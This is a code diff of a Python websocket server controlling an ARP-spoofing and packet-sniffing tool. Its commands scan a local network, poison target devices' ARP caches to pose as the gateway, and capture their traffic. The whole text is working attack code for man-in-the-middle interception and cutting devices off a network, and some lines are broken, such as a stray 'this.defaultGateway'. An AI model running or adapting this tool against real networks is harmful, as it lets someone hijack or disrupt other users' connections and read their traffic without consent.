@@ -3,19 +3,27 @@ import netcututils as nc
 import threading
 from scapy.all import *
 #Return an array with every IP of connected devices (on local network)
-spoofed = []
 defaultGateway = "192.168.0.254"
+spoofed = []
+sniffed = []
+spoofingThread = []
+sniffingThread = []
 
-def doit(target_ip, gateway_ip):
+def spoof(target_ip, gateway_ip):
     t = threading.currentThread()
     packet = nc.craft_arp_spoof(target_ip, gateway_ip)
 
     while getattr(t, "do_run", True):
-        send(packet)
+        send(packet, verbose = False)
+        
     time.sleep(1) #Optionnal
 
     # Reset the network back to its initial state (this is basically a correct ARP packet from a gateway to a target)
     send(ARP(op = 2, psrc = gateway_ip, hwsrc = getmacbyip(gateway_ip), pdst = target_ip, hwdst = getmacbyip(target_ip)))
+
+def sniff(target_ip, gateway_ip):
+    t = threading.currentThread()
+    nc.sniffing(target_ip, gateway_ip)
 
 async def echo(websocket, path):
     
@@ -24,31 +32,52 @@ async def echo(websocket, path):
         request = json.loads(message)
         if request[0] == "nmap_scan":
             await websocket.send(json.dumps(nc.nmap_scan()))
+
         elif request[0] == "arp_scan":
             await websocket.send(json.dumps(nc.arp_scan()))
+
         elif request[0] == "arp_spoof":
-            if request.len() > 2 && spoofed.count(request[1]) < 1 :
-                spoofed.add(request[1])
-                t = threading.Thread(target=doit, args=(request[1], request[2]))
+
+            if len(request) > 2 and spoofed.count(request[1]) < 1 :
+                spoofed.append(request[1])
+                t = threading.Thread(target=spoof, args=(request[1], request[2]))
+                spoofingThread.insert(spoofed.index(request[1]), t)
                 t.start()
-            elif request.len() = 2 && spoofed.count(request[1]) < 1 :
-                spoofed.add(request[1])
-                t = threading.Thread(target=doit, args=(request[1], defaultGateway))
+
+            elif len(request) == 2 and spoofed.count(request[1]) < 1 :
+                spoofed.append(request[1])
+                t = threading.Thread(target=spoof, args=(request[1], defaultGateway))
+                spoofingThread.insert(spoofed.index(request[1]), t)
+
                 t.start()
+
+        elif request[0] == "sniff":
+            if len(request) == 2:
+                sniffed.append(request[1])
+                print(sniffed)
+                t = threading.Thread(target=sniff, args=(request[1], defaultGateway))
+                sniffingThread.insert(sniffed.index(request[1]), t)
+                print(sniffingThread)
+                t.start()
+
         elif request[0] == "gateway":
-            this.defaultGateway = request[1]    
-        elif request[0] == "stop":
+            this.defaultGateway = request[1]   
+
+        elif request[0] == "spoof_stop":
+            t = spoofingThread[spoofed.index(request[1])]
+            spoofed.remove(request[1])
             t.do_run = False
             t.join()
+            print(t)
+        elif request[0] == "sniff_stop":
+            t = sniffingThread[sniffed.index(request[1])]
+            sniffed.remove(request[1])
+            t.do_run = False
+            t.join()
+            print(t)
         else:
             await websocket.send("this request doesn't exist")
-
         
-        # print(f'1 , {request[0]} \n')
-        # print(f'2 , {request[1]}')
-       
-        # await websocket.send(json.dumps(nmap_scan()))
-        print("scan end")
 
 asyncio.get_event_loop().run_until_complete(
     websockets.serve(echo, 'localhost', 8765))
